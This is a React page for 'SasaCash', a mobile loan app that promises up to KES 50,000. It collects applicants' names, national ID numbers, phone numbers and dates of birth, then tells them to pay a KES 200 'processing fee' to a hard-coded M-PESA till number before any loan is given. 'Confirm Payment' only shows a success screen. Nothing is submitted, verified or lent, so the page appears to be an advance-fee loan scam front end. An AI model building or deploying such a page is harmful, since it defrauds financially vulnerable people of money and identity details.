"use client";
import { useState } from "react";

export default function Home() {
  const [page, setPage] = useState("home");

  const [form, setForm] = useState({
    firstName: "",
    middleName: "",
    lastName: "",
    id: "",
    phone: "",
    dob: "",
    maritalStatus: "",
    employmentStatus: "",
    amount: "",
    months: "",
    purpose: "",
  });

  const handleChange = (e) => {
    setForm({ ...form, [e.target.name]: e.target.value });
  };

  const loan = Number(form.amount) || 0;
  const months = Number(form.months) || 0;
  const interest = loan * 0.15;
  const total = loan + interest;
  const monthly = months ? total / months : 0;

  const getProgress = () => {
    switch (page) {
      case "personal": return 25;
      case "loan": return 50;
      case "review": return 75;
      case "payment": return 100;
      default: return 0;
    }
  };

  const validatePersonal = () => {
    return (
      form.firstName &&
      form.lastName &&
      form.id &&
      form.phone &&
      form.dob &&
      form.maritalStatus &&
      form.employmentStatus
    );
  };

  const validateLoan = () => {
    return (
      form.amount >= 1000 &&
      form.amount <= 50000 &&
      form.months >= 1 &&
      form.months <= 12 &&
      form.purpose
    );
  };

  // HOME
  if (page === "home") {
    return (
      <div style={styles.container}>
        <img src="/logo.png" style={styles.logo} />

        <div style={styles.card}>
          <h2>Get up to KES 50,000</h2>
          <p>Fast loans. Fixed 15% interest.</p>

          <button style={styles.primaryBtn} onClick={() => setPage("personal")}>
            Apply Now →
          </button>
        </div>

        <h3 style={styles.sectionTitle}>Why Choose SasaCash?</h3>

        <div style={styles.feature}>⚡ Instant Processing<br /><small>Get your loan within hours</small></div>
        <div style={styles.feature}>🔒 Secure & Private<br /><small>Your data is protected</small></div>
        <div style={styles.feature}>✅ Simple Process<br /><small>Easy 4-step application</small></div>
      </div>
    );
  }

  // PERSONAL
  if (page === "personal") {
    return (
      <div style={styles.container}>
        <h2>Personal Information</h2>

        <div style={styles.progressContainer}>
          <div style={{ ...styles.progressBar, width: `${getProgress()}%` }} />
        </div>
        <p style={styles.progressText}>Step 1 of 4</p>

        <label>First Name *</label>
        <input name="firstName" onChange={handleChange} style={styles.input} />

        <label>Middle Name (optional)</label>
        <input name="middleName" onChange={handleChange} style={styles.input} />

        <label>Last Name *</label>
        <input name="lastName" onChange={handleChange} style={styles.input} />

        <label>ID Number *</label>
        <input name="id" onChange={handleChange} style={styles.input} />

        <label>Phone Number *</label>
        <input name="phone" onChange={handleChange} style={styles.input} />

        <label>Date of Birth *</label>
        <input type="date" name="dob" onChange={handleChange} style={styles.input} />

        <label>Marital Status *</label>
        <select name="maritalStatus" onChange={handleChange} style={styles.input}>
          <option value="">Select</option>
          <option>Single</option>
          <option>Married</option>
          <option>Divorced</option>
          <option>Widowed</option>
        </select>

        <label>Employment Status *</label>
        <select name="employmentStatus" onChange={handleChange} style={styles.input}>
          <option value="">Select</option>
          <option>Employed</option>
          <option>Self Employed</option>
          <option>Business</option>
          <option>Student</option>
          <option>Other</option>
        </select>

        <button
          style={styles.primaryBtn}
          onClick={() => {
            if (!validatePersonal()) {
              alert("Please fill all required fields (*)");
              return;
            }
            setPage("loan");
          }}
        >
          Next
        </button>
      </div>
    );
  }

  // LOAN
  if (page === "loan") {
    return (
      <div style={styles.container}>
        <h2>Loan Details</h2>

        <div style={styles.progressContainer}>
          <div style={{ ...styles.progressBar, width: `${getProgress()}%` }} />
        </div>
        <p style={styles.progressText}>Step 2 of 4</p>

        <label>Loan Amount (KES 1,000 - 50,000) *</label>
        <input name="amount" type="number" onChange={handleChange} style={styles.input} />

        <label>Repayment Period (1 - 12 months) *</label>
        <input name="months" type="number" onChange={handleChange} style={styles.input} />

        <label>Loan Purpose *</label>
        <select name="purpose" onChange={handleChange} style={styles.input}>
          <option value="">Select</option>
          <option>Business</option>
          <option>Personal</option>
          <option>Medical</option>
          <option>Emergency</option>
          <option>Other</option>
        </select>

        {loan > 0 && (
          <div style={styles.cardWhite}>
            <h3>Loan Summary</h3>
            <p>Loan: KES {loan}</p>
            <p>Interest (15%): KES {interest}</p>
            <p>Total: KES {total}</p>
            <p>Monthly: KES {monthly.toFixed(2)}</p>
          </div>
        )}

        <button style={styles.secondaryBtn} onClick={() => setPage("personal")}>Back</button>

        <button
          style={styles.primaryBtn}
          onClick={() => {
            if (!validateLoan()) {
              alert("Please fill all required fields correctly");
              return;
            }
            setPage("review");
          }}
        >
          Next
        </button>
      </div>
    );
  }

  // REVIEW
  if (page === "review") {
  return (
    <div style={styles.container}>
      <h2>Review Your Application</h2>

      <div style={styles.progressContainer}>
        <div style={{ ...styles.progressBar, width: `${getProgress()}%` }} />
      </div>
      <p style={styles.progressText}>Step 3 of 4</p>

      {/* PERSONAL INFO */}
      <div style={styles.cardWhite}>
        <h3>Personal Information</h3>
        <p><strong>First Name:</strong> {form.firstName}</p>
        <p><strong>Middle Name:</strong> {form.middleName || "-"}</p>
        <p><strong>Last Name:</strong> {form.lastName}</p>
        <p><strong>ID Number:</strong> {form.id}</p>
        <p><strong>Phone:</strong> {form.phone}</p>
        <p><strong>Date of Birth:</strong> {form.dob}</p>
        <p><strong>Marital Status:</strong> {form.maritalStatus}</p>
        <p><strong>Employment Status:</strong> {form.employmentStatus}</p>
      </div>

      {/* LOAN DETAILS */}
      <div style={styles.cardWhite}>
        <h3>Loan Details</h3>
        <p><strong>Loan Amount:</strong> KES {loan}</p>
        <p><strong>Repayment Period:</strong> {form.months} months</p>
        <p><strong>Loan Purpose:</strong> {form.purpose}</p>
        <p><strong>Interest (15%):</strong> KES {interest}</p>
        <p><strong>Total Repayment:</strong> KES {total}</p>
        <p><strong>Monthly Payment:</strong> KES {monthly.toFixed(2)}</p>
      </div>

      <button style={styles.secondaryBtn} onClick={() => setPage("loan")}>
        Back
      </button>

      <button style={styles.primaryBtn} onClick={() => setPage("payment")}>
        Confirm & Proceed
      </button>
    </div>
  );
}

  // PAYMENT
  if (page === "payment") {
    return (
      <div style={styles.container}>
        <h2>Processing Fee Payment</h2>

        <div style={styles.progressContainer}>
          <div style={{ ...styles.progressBar, width: `${getProgress()}%` }} />
        </div>
        <p style={styles.progressText}>Step 4 of 4</p>

        <p>Pay a processing fee of <strong>KES 200</strong></p>

        <div style={styles.cardWhite}>
          <p>1. Go to M-PESA menu</p>
          <p>2. Select Lipa Na M-PESA</p>
          <p>3. Select Buy Goods and Services</p>
          <p>4. Enter Till Number <strong>8808802</strong></p>
          <p>5. Enter amount KES 200</p>
          <p>6. Enter M-PESA PIN and press OK</p>
        </div>

        <p style={{ color: "red", fontWeight: "bold" }}>
          NOTE: You will receive your loan if you have paid the processing fee.
        </p>

        <button style={styles.primaryBtn} onClick={() => setPage("success")}>
          Confirm Payment
        </button>
      </div>
    );
  }

  // SUCCESS
  if (page === "success") {
    return (
      <div style={styles.container}>
        <div style={styles.cardWhite}>
          <h2>✅ Application Submitted</h2>
          <p>Your loan application has been received successfully.</p>

          <button style={styles.primaryBtn} onClick={() => setPage("home")}>
            Back to Home
          </button>
        </div>
      </div>
    );
  }
}

const styles = {
  container: {
    maxWidth: "420px",
    margin: "auto",
    padding: "20px",
    fontFamily: "system-ui",
    background: "#f5f7fb",
    minHeight: "100vh",
  },
  logo: { width: "100px", marginBottom: "20px" },
  card: {
    background: "linear-gradient(135deg,#0f9d58,#34d399)",
    color: "white",
    padding: "20px",
    borderRadius: "20px",
    marginBottom: "20px",
  },
  cardWhite: {
    background: "white",
    padding: "15px",
    borderRadius: "12px",
    marginTop: "15px",
  },
  feature: {
    background: "white",
    padding: "15px",
    margin: "10px 0",
    borderRadius: "12px",
  },
  sectionTitle: { marginTop: "20px", fontWeight: "bold" },
  input: {
    width: "100%",
    padding: "12px",
    margin: "5px 0 15px",
    borderRadius: "8px",
    border: "1px solid #ccc",
  },
  primaryBtn: {
    width: "100%",
    padding: "14px",
    background: "#0f9d58",
    color: "white",
    border: "none",
    borderRadius: "10px",
    marginTop: "10px",
  },
  secondaryBtn: {
    width: "100%",
    padding: "12px",
    background: "#ccc",
    border: "none",
    borderRadius: "10px",
    marginTop: "10px",
  },
  progressContainer: {
    width: "100%",
    height: "6px",
    background: "#ddd",
    borderRadius: "10px",
    margin: "10px 0",
  },
  progressBar: {
    height: "100%",
    background: "#0f9d58",
    borderRadius: "10px",
  },
  progressText: {
    fontSize: "12px",
    marginBottom: "10px",
  },
};
